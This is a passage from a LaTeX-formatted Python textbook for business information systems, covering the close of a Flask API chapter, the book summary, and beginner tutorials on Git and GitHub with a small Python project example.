\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Blueprints for Modular Code}: Blueprints help organize
  your application into modules.
\item
  \textbf{Use Environment Variables for Configuration}: Keep secrets and
  configuration out of your codebase.
\item
  \textbf{Enable Logging}: Set up logging to track errors and important
  events.
\item
  \textbf{Write Tests}: Ensure your code works as expected by writing
  unit tests.
\item
  \textbf{Documentation}: Use tools like Swagger or Postman to document
  your API.
\end{enumerate}

\section{Conclusion}\label{conclusion-54}

This tutorial has covered the essentials of developing RESTful APIs
using Flask. We've gone through setting up Flask, creating endpoints,
handling data, testing, and adding authentication. With this knowledge,
you can build scalable and maintainable APIs.

\bookmarksetup{startatroot}

\chapter{Summary}\label{summary}

As we conclude ``Python for Business Analytics and Information
Systems,'' it is my hope that this book has served as a comprehensive
and enlightening guide into the powerful role Python plays in the field
of business technology. From initial setup and basic programming
constructs to advanced system design and network management, the journey
through the chapters was designed to not only teach Python but also show
its extensive applications in real-world business scenarios.

\subsection{Key Takeaways}\label{key-takeaways}

\begin{itemize}
\item
  \textbf{Python Fundamentals}: We began with the basics---installing
  Python and setting up the environment, then moved on to Python syntax,
  control structures, functions, and modules. These foundations are
  crucial for anyone aspiring to build robust applications in Python.
\item
  \textbf{Advanced Python}: The deeper exploration into object-oriented
  programming, error handling, debugging, and data handling equipped you
  with the skills to write efficient and effective Python code. These
  skills are vital for developing sophisticated systems and ensuring
  their reliability and scalability.
\item
  \textbf{Business Applications}: We discussed how Python interacts with
  databases, APIs, and automates system tasks, which are essential
  components in systems analysis and design. Understanding these
  interactions allows for the creation of seamless and efficient
  business processes.
\item
  \textbf{System Design and Network Communications}: The detailed
  discussion on system design using Python and its role in business data
  communication, including network architecture and protocols,
  highlighted Python's versatility and its importance in maintaining and
  enhancing business operations.
\item
  \textbf{Version Control}: Finally, the appendix on version control
  underscored the importance of using tools like Git to manage changes
  and collaborate in professional environments, a critical skill for any
  modern programmer.
\end{itemize}

\subsection{Continuing Your Python
Journey}\label{continuing-your-python-journey}

While this book provides a solid foundation and broad coverage of
Python's applications in business analytics and information systems,
learning in technology is an ever-evolving process. I encourage you to
continue exploring Python's vast ecosystem and its emerging tools and
libraries. Participate in forums, contribute to open source projects,
and keep updating your skills with the latest developments in the field.

\subsection{Applying Your Knowledge}\label{applying-your-knowledge}

Practical application of knowledge is key to mastery. I recommend
applying the concepts learned in this book through internships, project
collaborations, and real-world problem-solving. This hands-on experience
will solidify your understanding and enhance your capability to innovate
and adapt in the fast-paced world of business technology.

\subsection{Final Thoughts}\label{final-thoughts}

``Python for Business Analytics and Information Systems'' was written
with the ambition of making Python accessible and useful for students
and professionals in business technology. As you close this book,
remember that your journey with Python is just beginning. The skills you
have acquired are the tools with which you will carve out your path in
the business world, driving innovation, efficiency, and success.

Thank you for choosing this book as your guide. Here's to your continued
success in your educational and professional endeavors in business
analytics and information systems!

\bookmarksetup{startatroot}

\chapter{Introduction to Version
Control}\label{introduction-to-version-control}

Version control is an essential tool for developers, allowing them to
manage and track changes in their codebase efficiently. This tutorial
will introduce you to version control, focusing on Git, a popular
version control system. You will learn the basics of Git, how to set up
a repository, and how to manage your project using Git commands.

\subsection{What is Version Control?}\label{what-is-version-control}

Version control is a system that records changes to a file or set of
files over time so that you can recall specific versions later. It helps
in: - \textbf{Tracking Changes}: Keeps a history of changes made to the
project. - \textbf{Collaboration}: Allows multiple people to work on a
project simultaneously. - \textbf{Backup}: Provides a safety net against
losing work.

\subsection{Types of Version Control
Systems}\label{types-of-version-control-systems}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Local Version Control Systems}: Maintain track of files within
  the local system.
\item
  \textbf{Centralized Version Control Systems (CVCS)}: Use a single
  server to store all changes and files, which can be accessed by
  multiple clients.
\item
  \textbf{Distributed Version Control Systems (DVCS)}: Each user has a
  local copy of the repository, including its complete history.
\end{enumerate}

Git is an example of a DVCS.

\subsection{Setting Up Git}\label{setting-up-git}

\subsubsection{Installation}\label{installation-3}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Windows}: Download and install from
  \href{https://gitforwindows.org/}{Git for Windows}.
\item
  \textbf{macOS}: Install via Homebrew (\texttt{brew\ install\ git}) or
  download from \href{https://git-scm.com/download/mac}{Git for macOS}.
\item
  \textbf{Linux}: Use the package manager for your distribution (e.g.,
  \texttt{sudo\ apt-get\ install\ git} for Debian-based distributions).
\end{enumerate}

\subsubsection{Configuration}\label{configuration}

After installing Git, configure it with your name and email:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ user.name }\StringTok{"Your Name"}
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ user.email }\StringTok{"youremail@example.com"}
\end{Highlighting}
\end{Shaded}

\subsection{Basic Git Commands}\label{basic-git-commands}

\subsubsection{Initializing a
Repository}\label{initializing-a-repository}

To start tracking a project, initialize a Git repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ init}
\end{Highlighting}
\end{Shaded}

\subsubsection{Cloning a Repository}\label{cloning-a-repository}

To make a copy of an existing repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ clone }\OperatorTok{\textless{}}\NormalTok{repository\_url}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Checking the Repository
Status}\label{checking-the-repository-status}

To see the status of your files in the working directory and staging
area:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ status}
\end{Highlighting}
\end{Shaded}

\subsubsection{Adding Files}\label{adding-files}

To stage changes (prepare them for commit):

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add }\OperatorTok{\textless{}}\NormalTok{file\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

To stage all changes:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add .}
\end{Highlighting}
\end{Shaded}

\subsubsection{Committing Changes}\label{committing-changes-1}

To commit staged changes to the repository with a message describing the
changes:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Your commit message"}
\end{Highlighting}
\end{Shaded}

\subsubsection{Viewing Commit History}\label{viewing-commit-history}

To view the commit history:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ log}
\end{Highlighting}
\end{Shaded}

\subsubsection{Branching}\label{branching}

Branches allow you to work on different parts of a project separately.

To create a new branch:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ branch }\OperatorTok{\textless{}}\NormalTok{branch\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

To switch to a branch:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout }\OperatorTok{\textless{}}\NormalTok{branch\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

To create and switch to a new branch:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout }\AttributeTok{{-}b} \OperatorTok{\textless{}}\NormalTok{branch\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Merging Branches}\label{merging-branches}

To merge changes from one branch into the current branch:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ merge }\OperatorTok{\textless{}}\NormalTok{branch\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Pushing Changes}\label{pushing-changes}

To upload your changes to a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push origin }\OperatorTok{\textless{}}\NormalTok{branch\_name}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Pulling Changes}\label{pulling-changes}

To fetch and merge changes from a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ pull}
\end{Highlighting}
\end{Shaded}

\subsection{Best Practices}\label{best-practices-12}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Commit Often}: Make frequent commits with meaningful messages.
\item
  \textbf{Use Branches}: Create branches for new features or bug fixes.
\item
  \textbf{Review Changes}: Use \texttt{git\ diff} to review changes
  before committing.
\item
  \textbf{Collaborate}: Use pull requests and code reviews in team
  projects.
\end{enumerate}

\subsection{Conclusion}\label{conclusion-55}

Version control is a vital part of modern software development, enabling
better collaboration, tracking, and management of changes. Git, as a
powerful DVCS, offers robust features to handle projects of any size. By
mastering Git commands and best practices, you can enhance your
productivity and maintain a clean, organized codebase.

\section{Introduction to GitHub}\label{introduction-to-github}

GitHub is a web-based platform that uses Git for version control and
provides a collaborative environment for developers to work on projects.
This tutorial will guide you through the basics of using GitHub, from
setting up an account to managing repositories and collaborating with
others.

\subsection{Setting Up GitHub}\label{setting-up-github}

\subsubsection{Creating an Account}\label{creating-an-account}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Go to \href{https://github.com/}{GitHub}.
\item
  Click on ``Sign up'' and follow the instructions to create your
  account.
\end{enumerate}

\subsubsection{Setting Up Git}\label{setting-up-git-1}

Before using GitHub, ensure that Git is installed and configured on your
local machine. If not, refer to the
\href{https://git-scm.com/book/en/v2/Getting-Started-Installing-Git}{Git
tutorial} for installation instructions.

\subsection{Basic GitHub Workflow}\label{basic-github-workflow}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Create a Repository}: A repository (or repo) is a storage
  space where your project lives.
\item
  \textbf{Clone the Repository}: Download a copy of the repository to
  your local machine.
\item
  \textbf{Make Changes}: Edit, add, or delete files in your project.
\item
  \textbf{Commit Changes}: Save snapshots of your project's history.
\item
  \textbf{Push Changes}: Upload your changes to GitHub.
\item
  \textbf{Collaborate}: Work with others using branches, pull requests,
  and issues.
\end{enumerate}

\subsection{Creating a Repository}\label{creating-a-repository}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Log in to your GitHub account.
\item
  Click on the ``+'' icon in the upper-right corner and select ``New
  repository''.
\item
  Fill in the repository name, description (optional), and choose
  whether it will be public or private.
\item
  Click ``Create repository''.
\end{enumerate}

\subsection{Cloning a Repository}\label{cloning-a-repository-1}

To work on a repository locally, clone it to your machine:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ clone https://github.com/your{-}username/your{-}repository.git}
\end{Highlighting}
\end{Shaded}

\subsection{Making Changes}\label{making-changes}

Navigate to the repository directory:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ your{-}repository}
\end{Highlighting}
\end{Shaded}

Edit files as needed using your preferred text editor or IDE.

\subsection{Committing Changes}\label{committing-changes-2}

After making changes, add and commit them:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add .}
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Describe your changes"}
\end{Highlighting}
\end{Shaded}

\subsection{Pushing Changes}\label{pushing-changes-1}

Upload your changes to GitHub:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push origin main}
\end{Highlighting}
\end{Shaded}

Replace \texttt{main} with your branch name if you are working on a
different branch.

\subsection{Collaborating with GitHub}\label{collaborating-with-github}

\subsubsection{Branches}\label{branches}

Branches allow multiple people to work on a project simultaneously
without interfering with each other's work.

\begin{itemize}
\tightlist
\item
  \textbf{Create a branch}:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout }\AttributeTok{{-}b}\NormalTok{ feature{-}branch}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \textbf{Switch to a branch}:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout feature{-}branch}
\end{Highlighting}
\end{Shaded}

\subsubsection{Pull Requests}\label{pull-requests}

Pull requests are a way to propose changes to a repository and have them
reviewed before merging.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Push your branch to GitHub:
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push origin feature{-}branch}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{1}
\tightlist
\item
  Go to the GitHub repository and click ``Compare \& pull request''.
\item
  Review your changes, add a descriptive message, and click ``Create
  pull request''.
\end{enumerate}

\subsubsection{Merging Pull Requests}\label{merging-pull-requests}

After a pull request is reviewed and approved, it can be merged:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Go to the pull request on GitHub.
\item
  Click ``Merge pull request''.
\item
  Confirm the merge.
\end{enumerate}

\subsubsection{Issues}\label{issues}

Issues are used to track bugs, enhancements, or other tasks related to
the project.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Go to the ``Issues'' tab in your repository.
\item
  Click ``New issue''.
\item
  Fill in the title and description, then click ``Submit new issue''.
\end{enumerate}

\subsection{Best Practices}\label{best-practices-13}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Commit Often}: Regular commits with clear messages help track
  changes and make collaboration easier.
\item
  \textbf{Use Branches}: Separate new features, bug fixes, and
  experiments into branches.
\item
  \textbf{Review Code}: Use pull requests for code reviews before
  merging changes.
\item
  \textbf{Write Descriptive Messages}: Clear commit messages and pull
  request descriptions help others understand your changes.
\item
  \textbf{Document Your Project}: Use README files and GitHub Wiki to
  document your project and its usage.
\end{enumerate}

\subsection{Conclusion}\label{conclusion-56}

GitHub is a powerful platform for version control and collaboration. By
mastering GitHub's features and following best practices, you can manage
your projects more efficiently and work effectively with others. Start
exploring GitHub, create repositories, and collaborate on exciting
projects!

\bookmarksetup{startatroot}

\chapter{Deep Dive into Using Git on a Local Machine with a Full-Length
Python
Example}\label{deep-dive-into-using-git-on-a-local-machine-with-a-full-length-python-example}

Git is a powerful tool for version control that allows multiple people
to work on a project simultaneously without interfering with each
other's work. In this tutorial, we'll provide a comprehensive guide on
how to use Git on a local machine, incorporating a full-length Python
project example.

\section{Table of Contents}\label{table-of-contents-25}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-git]{Introduction to Git}
\item
  \hyperref[installing-git]{Installing Git}
\item
  \hyperref[setting-up-git]{Setting Up Git}
\item
  \hyperref[creating-a-new-repository]{Creating a New Repository}
\item
  \hyperref[basic-git-workflow]{Basic Git Workflow}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[staging-and-committing-changes]{Staging and Committing
    Changes}
  \item
    \hyperref[viewing-commit-history]{Viewing Commit History}
  \item
    \hyperref[undoing-changes]{Undoing Changes}
  \end{itemize}
\item
  \hyperref[branching-and-merging]{Branching and Merging}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[creating-and-switching-branches]{Creating and Switching
    Branches}
  \item
    \hyperref[merging-branches]{Merging Branches}
  \item
    \hyperref[resolving-conflicts]{Resolving Conflicts}
  \end{itemize}
\item
  \hyperref[working-with-remote-repositories]{Working with Remote
  Repositories}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[adding-a-remote]{Adding a Remote}
  \item
    \hyperref[pushing-to-a-remote-repository]{Pushing to a Remote
    Repository}
  \item
    \hyperref[pulling-from-a-remote-repository]{Pulling from a Remote
    Repository}
  \item
    \hyperref[cloning-a-repository]{Cloning a Repository}
  \end{itemize}
\item
  \hyperref[advanced-git-operations]{Advanced Git Operations}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[stashing-changes]{Stashing Changes}
  \item
    \hyperref[rebasing]{Rebasing}
  \item
    \hyperref[tagging]{Tagging}
  \end{itemize}
\item
  \hyperref[git-configuration-and-customization]{Git Configuration and
  Customization}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Git}\label{introduction-to-git}

Git is a distributed version control system that helps developers keep
track of changes in their code. It is especially useful for
collaborating on projects, maintaining different versions of a project,
and reverting to previous states when necessary.

\section{Installing Git}\label{installing-git}

\subsection{Windows}\label{windows-2}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Download the installer from
  \href{https://git-scm.com/download/win}{git-scm.com}.
\item
  Run the installer and follow the setup wizard.
\end{enumerate}

\subsection{macOS}\label{macos-1}

You can install Git using Homebrew:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install git}
\end{Highlighting}
\end{Shaded}

Alternatively, you can download the installer from
\href{https://git-scm.com/download/mac}{git-scm.com}.

\subsection{Linux}\label{linux-1}

On Debian-based distributions (like Ubuntu):

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt update}
\FunctionTok{sudo}\NormalTok{ apt install git}
\end{Highlighting}
\end{Shaded}

On Red Hat-based distributions (like Fedora):

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ dnf install git}
\end{Highlighting}
\end{Shaded}

\section{Setting Up Git}\label{setting-up-git-2}

After installing Git, configure it with your personal information:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ user.name }\StringTok{"Your Name"}
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ user.email }\StringTok{"your.email@example.com"}
\end{Highlighting}
\end{Shaded}

To verify your configuration:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}list}
\end{Highlighting}
\end{Shaded}

\section{Creating a New Repository}\label{creating-a-new-repository}

Navigate to your project directory and initialize a new Git repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ my\_python\_project}
\BuiltInTok{cd}\NormalTok{ my\_python\_project}
\FunctionTok{git}\NormalTok{ init}
\end{Highlighting}
\end{Shaded}

\section{Basic Git Workflow}\label{basic-git-workflow}

\subsection{Staging and Committing
Changes}\label{staging-and-committing-changes}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Create a Python file:}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# my\_script.py}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Hello, World!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Stage the file:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add my\_script.py}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Commit the changes:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Add initial version of my\_script.py"}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Viewing Commit History}\label{viewing-commit-history-1}

To view the commit history:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ log}
\end{Highlighting}
\end{Shaded}

For a compact view:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ log }\AttributeTok{{-}{-}oneline}
\end{Highlighting}
\end{Shaded}

\subsection{Undoing Changes}\label{undoing-changes}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Unstage a file:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ reset my\_script.py}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Discard changes in a file:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout }\AttributeTok{{-}{-}}\NormalTok{ my\_script.py}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Revert to a previous commit:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ revert }\OperatorTok{\textless{}}\NormalTok{commit{-}hash}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Branching and Merging}\label{branching-and-merging}

\subsection{Creating and Switching
Branches}\label{creating-and-switching-branches}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Create a new branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ branch feature{-}branch}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Switch to the new branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout feature{-}branch}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Merging Branches}\label{merging-branches-1}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Switch to the main branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout main}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Merge the feature branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ merge feature{-}branch}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Resolving Conflicts}\label{resolving-conflicts}

When merging branches, you might encounter conflicts. Open the files
with conflicts, resolve them, then stage and commit the resolved files.

\section{Working with Remote
Repositories}\label{working-with-remote-repositories}

\subsection{Adding a Remote}\label{adding-a-remote}

To add a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ remote add origin }\OperatorTok{\textless{}}\NormalTok{remote{-}url}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsection{Pushing to a Remote
Repository}\label{pushing-to-a-remote-repository}

To push changes to a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push origin main}
\end{Highlighting}
\end{Shaded}

\subsection{Pulling from a Remote
Repository}\label{pulling-from-a-remote-repository}

To pull changes from a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ pull origin main}
\end{Highlighting}
\end{Shaded}

\subsection{Cloning a Repository}\label{cloning-a-repository-2}

To clone a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ clone }\OperatorTok{\textless{}}\NormalTok{repository{-}url}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\section{Advanced Git Operations}\label{advanced-git-operations}

\subsection{Stashing Changes}\label{stashing-changes}

To save your changes without committing them:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ stash}
\end{Highlighting}
\end{Shaded}

To apply stashed changes:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ stash apply}
\end{Highlighting}
\end{Shaded}

\subsection{Rebasing}\label{rebasing}

To reapply commits on top of another base tip:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Switch to the branch you want to rebase:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout feature{-}branch}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Rebase onto another branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ rebase main}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Tagging}\label{tagging}

To create a tag:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ tag v1.0}
\end{Highlighting}
\end{Shaded}

To push tags to a remote repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push }\AttributeTok{{-}{-}tags}
\end{Highlighting}
\end{Shaded}

\section{Full-Length Python Project
Example}\label{full-length-python-project-example}

Let's create a simple Python project to demonstrate a more comprehensive
Git workflow.

\subsection{Step 1: Create the Project
Structure}\label{step-1-create-the-project-structure}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ my\_python\_project}
\BuiltInTok{cd}\NormalTok{ my\_python\_project}
\FunctionTok{mkdir}\NormalTok{ src tests}
\FunctionTok{touch}\NormalTok{ src/\_\_init\_\_.py tests/\_\_init\_\_.py}
\end{Highlighting}
\end{Shaded}

\subsection{Step 2: Initialize Git
Repository}\label{step-2-initialize-git-repository}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ init}
\end{Highlighting}
\end{Shaded}

\subsection{Step 3: Create the Main
Application}\label{step-3-create-the-main-application}

Create a simple Python script \texttt{src/app.py}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# src/app.py}
\KeywordTok{def}\NormalTok{ greet(name):}
    \ControlFlowTok{return} \SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(greet(}\StringTok{"World"}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Step 4: Create a Test}\label{step-4-create-a-test}

Create a test file \texttt{tests/test\_app.py}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# tests/test\_app.py}
\ImportTok{import}\NormalTok{ unittest}
\ImportTok{from}\NormalTok{ src.app }\ImportTok{import}\NormalTok{ greet}

\KeywordTok{class}\NormalTok{ TestApp(unittest.TestCase):}
    \KeywordTok{def}\NormalTok{ test\_greet(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(greet(}\StringTok{"World"}\NormalTok{), }\StringTok{"Hello, World!"}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\subsection{Step 5: Stage and Commit
Changes}\label{step-5-stage-and-commit-changes}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add src/app.py tests/test\_app.py}
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Add main application and test"}
\end{Highlighting}
\end{Shaded}

\subsection{Step 6: Create a Feature
Branch}\label{step-6-create-a-feature-branch}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout }\AttributeTok{{-}b}\NormalTok{ feature{-}add{-}logging}
\end{Highlighting}
\end{Shaded}

\subsection{Step 7: Implement a New
Feature}\label{step-7-implement-a-new-feature}

Modify \texttt{src/app.py} to add logging:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# src/app.py}
\ImportTok{import}\NormalTok{ logging}

\NormalTok{logging.basicConfig(level}\OperatorTok{=}\NormalTok{logging.INFO)}

\KeywordTok{def}\NormalTok{ greet(name):}
\NormalTok{    greeting }\OperatorTok{=} \SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}
\NormalTok{    logging.info(greeting)}
    \ControlFlowTok{return}\NormalTok{ greeting}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(greet(}\StringTok{"World"}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Step 8: Stage and Commit
Changes}\label{step-8-stage-and-commit-changes}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add src/app.py}
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Add logging to greet function"}
\end{Highlighting}
\end{Shaded}

\subsection{Step 9: Merge Feature
Branch}\label{step-9-merge-feature-branch}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Switch to the main branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ checkout main}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Merge the feature branch:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ merge feature{-}add{-}logging}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Step 10: Push to Remote
Repository}\label{step-10-push-to-remote-repository}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push origin main}
\end{Highlighting}
\end{Shaded}

\section{Git Configuration and
Customization}\label{git-configuration-and-customization}

You can customize Git using configuration files. For example, to set up
aliases:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ alias.co checkout}
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ alias.br branch}
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ alias.ci commit}
\FunctionTok{git}\NormalTok{ config }\AttributeTok{{-}{-}global}\NormalTok{ alias.st status}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-14}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Commit often}: Regular commits make it easier to track changes
  and revert if needed.
\item
  \textbf{Use meaningful commit messages}: Write clear, descriptive
  commit messages.
\item
  \textbf{Keep branches short-lived}: Merge branches back into the main
  branch regularly.
\item
  \textbf{Regularly pull changes}: Keep your local repository up-to-date
  with the remote repository.
\item
  \textbf{Review diffs before committing}: Check what changes you're
